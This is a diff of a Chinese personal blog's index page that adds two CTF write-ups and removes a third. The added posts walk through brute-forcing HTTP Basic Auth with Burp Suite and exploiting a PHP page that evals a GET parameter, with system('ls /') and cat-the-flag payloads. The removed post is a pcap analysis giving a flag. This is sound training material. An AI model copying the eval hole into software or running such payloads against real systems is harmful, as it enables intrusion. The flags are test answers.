@@ -133,7 +133,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">9</span></a>
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">11</span></a>
 
   </li>
   </ul>
@@ -159,6 +159,159 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/01/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Dvgd.jpg">
+      <meta itemprop="name" content="Dvgd">
+      <meta itemprop="description" content="Welcome to my blog.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dvgd">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/02/01/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/" class="post-title-link" itemprop="url">web-基础认证</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-02-01 22:06:29 / 修改时间：22:13:02" itemprop="dateCreated datePublished" datetime="2023-02-01T22:06:29+08:00">2023-02-01</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>1、打开题目环境</p>
+<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/115e8182e56a4dc9bb03b150c2434453.png" alt="img"></p>
+<p>2、点击click跳出来一个登录弹窗，随便输入用户名和密码登录试试，没有返回任何有用信息</p>
+<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/11af9f2d902545a89457537ad97031cd.png" alt="img"></p>
+<p>3、查看附件，得到一堆密码，应该是要直接爆破</p>
+<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/8a93fcba23064b469ef3f2dabe1995c6.png" alt="img"></p>
+<p>4、点击click<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020">抓包</a>后发送到repeater模块，重新发包得到”Do u know admin”的信息，猜测用户名即为admin</p>
+<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/e6bc18b23c544e5aa3d5108c24479dd4.png" alt="img"></p>
+<p>4、输入用户名和密码后抓包，看到一串<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=base64%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">base64加密</a>过的字符</p>
+<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/22cf876256334313b0d68bdd34b8a523.png" alt="img"></p>
+<p>丢到解码器里解码，发现是我刚输进去的用户名和密码，中间用冒号隔开了（冒号划重点！</p>
+<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/0fe41ea078914b1d80c09fa9c4927f76.png" alt="img"></p>
+<p>6、把包发送到爆破模块，给刚刚的base64密码添加变量（这里截图截错了，添加完变量后应该这段字符前后各有一个§符号）</p>
+<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/8d5a666fff6f4e6babb6f3abca86c959.png" alt="img"></p>
+<p> 7、在payload options[simple list]模块把题目附件里面的密码粘贴进去</p>
+<p>8、添加前缀，admin后面一定不要忘记加冒号！</p>
+<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/8de3db8daf804ad3b08cf334e3fcc49e.png" alt="img"></p>
+<p> 添加base64编码</p>
+<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/8c03ad1544f440e09eaf0cbc7e7c4a5a.png" alt="img"></p>
+<p> 9、把特殊符号的url编码取消，不然&#x3D;会被转换成%3d</p>
+<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/be2d147292674f10b416b3aa2517e580.png" alt="img"></p>
+<p> 10、全部布置完是这个样子</p>
+<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/2ed2adeda37b4b4fa4a65e0cf3cfe290.png" alt="img"></p>
+<p>11、开始爆破，发现长度不一样的了</p>
+<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/2a9ba7de13214ee1a7467e3f8f6f7bba.png" alt="img"></p>
+<p> 12、在raw模块复制后查看response，得到flag</p>
+<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/6001e858ddba4d7c831cfe370005aef2.png" alt="img"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/29/easyrce/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Dvgd.jpg">
+      <meta itemprop="name" content="Dvgd">
+      <meta itemprop="description" content="Welcome to my blog.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dvgd">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/01/29/easyrce/" class="post-title-link" itemprop="url">easyrce</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-01-29 12:25:36 / 修改时间：12:35:25" itemprop="dateCreated datePublished" datetime="2023-01-29T12:25:36+08:00">2023-01-29</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>命令执行，连过滤都没有，直接构造命令</p>
+<h3 id="1-ls列出文件"><a href="#1-ls列出文件" class="headerlink" title="1.ls列出文件"></a>1.ls列出文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?system=(<span class="string">&quot;ls /&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/easyrce/2496929-20220627215105465-1604391209.jpg" alt="img"></p>
+<h2 id="2-cat查看可疑文件flllllaaaaaaggggggg"><a href="#2-cat查看可疑文件flllllaaaaaaggggggg" class="headerlink" title="2.cat查看可疑文件flllllaaaaaaggggggg"></a>2.cat查看可疑文件flllllaaaaaaggggggg</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=<span class="title function_ invoke__">system</span>(cat /flllllaaaaaaggggggg);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/easyrce/2496929-20220627215258362-300026015.jpg" alt="img"></p>
+<p>要记得最后以分号结尾，不然不执行</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -760,74 +913,11 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/04/BUUCTF-%E8%A2%AB%E5%8A%AB%E6%8C%81%E7%9A%84%E7%A5%9E%E7%A7%98%E7%A4%BC%E7%89%A9/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/Dvgd.jpg">
-      <meta itemprop="name" content="Dvgd">
-      <meta itemprop="description" content="Welcome to my blog.">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dvgd">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/01/04/BUUCTF-%E8%A2%AB%E5%8A%AB%E6%8C%81%E7%9A%84%E7%A5%9E%E7%A7%98%E7%A4%BC%E7%89%A9/" class="post-title-link" itemprop="url">BUUCTF-被劫持的神秘礼物</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-01-04 13:50:49 / 修改时间：18:34:42" itemprop="dateCreated datePublished" datetime="2023-01-04T13:50:49+08:00">2023-01-04</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h6 id="题目-被劫持的神秘礼物"><a href="#题目-被劫持的神秘礼物" class="headerlink" title="题目:被劫持的神秘礼物"></a>题目:<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%E8%A2%AB%E5%8A%AB%E6%8C%81%E7%9A%84%E7%A5%9E%E7%A7%98%E7%A4%BC%E7%89%A9">被劫持的神秘礼物</a></h6><h6 id="某天小明收到了一件很特别的礼物，有奇怪的后缀，奇怪的名字和格式。小明找到了知心姐姐度娘，度娘好像知道这是啥，但是度娘也不知道里面是啥。。。你帮帮小明？找到帐号密码，串在一起，用32位小写MD5哈希一下得到的就是答案。-链接-https-pan-baidu-com-s-1pwVVpA5-WWY8Og6dhCcWRw-提取码-31vk-注意：得到的-flag-请包上-flag-提交"><a href="#某天小明收到了一件很特别的礼物，有奇怪的后缀，奇怪的名字和格式。小明找到了知心姐姐度娘，度娘好像知道这是啥，但是度娘也不知道里面是啥。。。你帮帮小明？找到帐号密码，串在一起，用32位小写MD5哈希一下得到的就是答案。-链接-https-pan-baidu-com-s-1pwVVpA5-WWY8Og6dhCcWRw-提取码-31vk-注意：得到的-flag-请包上-flag-提交" class="headerlink" title="某天小明收到了一件很特别的礼物，有奇怪的后缀，奇怪的名字和格式。小明找到了知心姐姐度娘，度娘好像知道这是啥，但是度娘也不知道里面是啥。。。你帮帮小明？找到帐号密码，串在一起，用32位小写MD5哈希一下得到的就是答案。 链接: https://pan.baidu.com/s/1pwVVpA5_WWY8Og6dhCcWRw 提取码: 31vk 注意：得到的 flag 请包上 flag{} 提交"></a>某天小明收到了一件很特别的礼物，有奇怪的后缀，奇怪的名字和格式。小明找到了知心姐姐度娘，度娘好像知道这是啥，但是度娘也不知道里面是啥。。。你帮帮小明？找到帐号密码，串在一起，用32位小写MD5哈希一下得到的就是答案。 链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1pwVVpA5_WWY8Og6dhCcWRw">https://pan.baidu.com/s/1pwVVpA5_WWY8Og6dhCcWRw</a> 提取码: 31vk 注意：得到的 flag 请包上 flag{} 提交</h6><p>下载后得到文件gift.pcapng</p>
-<p>pcapng为流量包的后缀,这是一道典型的流量分析,我们用Wireshark打开流量包</p>
-<p><img src="/images/BUUCTF-%E8%A2%AB%E5%8A%AB%E6%8C%81%E7%9A%84%E7%A5%9E%E7%A7%98%E7%A4%BC%E7%89%A9/image-20230104120028859.png"></p>
-<p>追踪流发现</p>
-<p><img src="/images/BUUCTF-%E8%A2%AB%E5%8A%AB%E6%8C%81%E7%9A%84%E7%A5%9E%E7%A7%98%E7%A4%BC%E7%89%A9/image-20230104121724319.png"></p>
-<p>账号为admina,密码为adminb.</p>
-<p>由题目可知找到帐号密码，串在一起，用32位小写MD5哈希一下得到的就是答案</p>
-<p>所以flag为:flag{1d240aafe21a86afc11f38a45b541a49}</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
 
 
 
@@ -894,7 +984,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
